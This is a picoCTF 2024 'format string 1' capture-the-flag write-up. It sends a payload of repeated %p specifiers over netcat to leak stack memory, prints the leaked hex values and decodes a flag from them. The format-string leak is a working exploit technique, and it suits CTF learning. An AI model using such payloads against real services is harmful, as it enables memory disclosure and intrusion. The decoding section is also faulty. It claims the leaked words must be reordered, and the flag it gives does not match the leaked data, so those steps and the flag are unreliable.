# Description

Patrick and Sponge Bob were really happy with those <br>
orders you made for them, but now they're curious <br>
about the secret menu. Find it, and along the way, <br>
maybe you'll find something else of interest! <br>
Download the binary here. <br>
Download the source here. <br>
Connect with the challenge instance here: <br>
nc mimas.picoctf.net 57322

# Solution

Here is a better formatted version of this writeup on [picoCTF Solutions website](https://picoctfsolutions.com/picoctf-2024-format-string-1).

Can connect via this command: `nc mimas.picoctf.net 57322`

This payload of many `%p` values with commas could be sent to get the relevant values.

`%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p`

This gives many hex values:

`0x402118,(nil),0x73d0dde92a00,(nil),0x811880,0xa347834,0x7ffe00d7f2f0,0x73d0ddc83e60,0x73d0ddea84d0,0x1,0x7ffe00d7f3c0,(nil),(nil),0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x35625f673431665f,0x7d663839623764,0x7,0x73d0ddeaa8d8,0x2300000007,0x206e693374307250,0xa336c797453,0x9`

Then put it in [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&oeol=NEL) to convert from hex.

From there all of the bad values could be removed and easily seen what are the correct values that need to be looked at:

`0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x35625f673431665f,0x7d663839623764`

It first could be seen that it is in reverse order so in [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')Reverse('Character')&oeol=NEL) the reverse function could be added. It now looks like the text is in the right order because "picoCTF{" could be seen however it doesn't look like the flag because the actual hex values need to be re-arranged as well. Here is the correct order:

`0x7d663839623764,0x355f31346d316e34,0x35625f673431665f,0x3478345f33317937,0x7b4654436f636970`

Decoding this should give the flag.

Flag: `picoCTF{7y13_4x4_f14g_b54n1m41_5d7...}` 
